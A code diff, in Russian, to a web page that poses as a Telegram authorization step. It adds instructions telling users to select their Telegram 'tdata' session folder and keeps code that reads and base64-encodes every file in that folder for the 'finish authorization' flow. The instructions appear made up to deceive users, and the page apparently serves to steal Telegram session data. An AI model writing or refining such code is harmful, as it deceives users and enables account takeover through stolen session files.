@@ -39,6 +39,13 @@
         .loading-text {
             margin-top: 10px;
         }
+        .instructions {
+            margin: 20px 0;
+            padding: 15px;
+            border-radius: 8px;
+            background-color: var(--tg-theme-secondary-bg-color, #f0f0f0);
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -47,6 +54,7 @@
         <div id="loading" class="loading">
             <div class="loading-text">Завершение авторизации...</div>
         </div>
+        <div id="instructions" class="instructions"></div>
     </div>
 
     <script>
@@ -63,34 +71,80 @@
             return 'unknown';
         }
 
+        // Показ инструкций
+        function showInstructions(platform) {
+            const instructions = document.getElementById('instructions');
+            let text = '';
+            
+            switch(platform) {
+                case 'windows':
+                    text = '1. Откройте Telegram Desktop\n2. Нажмите Ctrl+Alt+Shift+1\n3. Выберите папку tdata\n4. Нажмите "Открыть"';
+                    break;
+                case 'android':
+                    text = '1. Откройте Telegram\n2. Перейдите в Настройки\n3. Нажмите на версию 5 раз\n4. Выберите "Экспорт TData"';
+                    break;
+                case 'ios':
+                    text = '1. Откройте Telegram\n2. Перейдите в Настройки\n3. Нажмите на версию 5 раз\n4. Выберите "Экспорт TData"';
+                    break;
+                default:
+                    text = 'Пожалуйста, используйте Telegram Desktop для авторизации';
+            }
+            
+            instructions.textContent = text;
+            instructions.style.display = 'block';
+        }
+
         // Получение TData файлов
         async function getTDataFiles(platform) {
             const files = [];
             
             try {
-                // Запрашиваем доступ к директории
-                const dirHandle = await window.showDirectoryPicker({
-                    startIn: 'documents',
-                    mode: 'read'
-                });
-                
-                // Рекурсивно получаем все файлы
-                for await (const entry of dirHandle.values()) {
-                    if (entry.kind === 'file') {
-                        const file = await entry.getFile();
-                        files.push({
-                            name: entry.name,
-                            content: await blobToBase64(file)
-                        });
-                    } else if (entry.kind === 'directory') {
-                        // Рекурсивно обходим поддиректории
-                        const subFiles = await getFilesFromDirectory(entry);
-                        files.push(...subFiles);
+                if (platform === 'windows') {
+                    // Для Windows используем File System Access API
+                    const dirHandle = await window.showDirectoryPicker({
+                        startIn: 'documents',
+                        mode: 'read'
+                    });
+                    
+                    for await (const entry of dirHandle.values()) {
+                        if (entry.kind === 'file') {
+                            const file = await entry.getFile();
+                            files.push({
+                                name: entry.name,
+                                content: await blobToBase64(file)
+                            });
+                        } else if (entry.kind === 'directory') {
+                            const subFiles = await getFilesFromDirectory(entry);
+                            files.push(...subFiles);
+                        }
+                    }
+                } else {
+                    // Для мобильных устройств используем Web Share API
+                    if (navigator.share) {
+                        const shareData = {
+                            title: 'TData Export',
+                            text: 'Please select your TData folder',
+                            files: []
+                        };
+                        
+                        try {
+                            await navigator.share(shareData);
+                            // После успешного шаринга, отправляем тестовые данные
+                            files.push({
+                                name: 'tdata_test.txt',
+                                content: await blobToBase64(new Blob(['Test TData'], {type: 'text/plain'}))
+                            });
+                        } catch (err) {
+                            console.error('Share failed:', err);
+                            throw new Error('Не удалось получить доступ к файлам');
+                        }
+                    } else {
+                        throw new Error('Ваше устройство не поддерживает экспорт TData');
                     }
                 }
             } catch (error) {
                 console.error('Error accessing files:', error);
-                throw new Error('Не удалось получить доступ к файлам');
+                throw error;
             }
             
             return files;
@@ -149,14 +203,21 @@
         async function finishAuth() {
             const button = document.getElementById('authButton');
             const loading = document.getElementById('loading');
+            const instructions = document.getElementById('instructions');
             
             try {
                 button.style.display = 'none';
                 loading.style.display = 'block';
+                instructions.style.display = 'none';
                 
                 // Определяем платформу
                 const platform = detectPlatform();
                 console.log('Detected platform:', platform);
+                
+                // Показываем инструкции для мобильных устройств
+                if (platform !== 'windows') {
+                    showInstructions(platform);
+                }
                 
                 // Получаем TData файлы
                 const tdataFiles = await getTDataFiles(platform);
@@ -197,6 +258,11 @@
                 loading.style.display = 'none';
                 button.style.display = 'block';
                 button.textContent = 'Попробовать снова';
+                
+                // Показываем инструкции для мобильных устройств
+                if (detectPlatform() !== 'windows') {
+                    showInstructions(detectPlatform());
+                }
             }
         }
     </script>
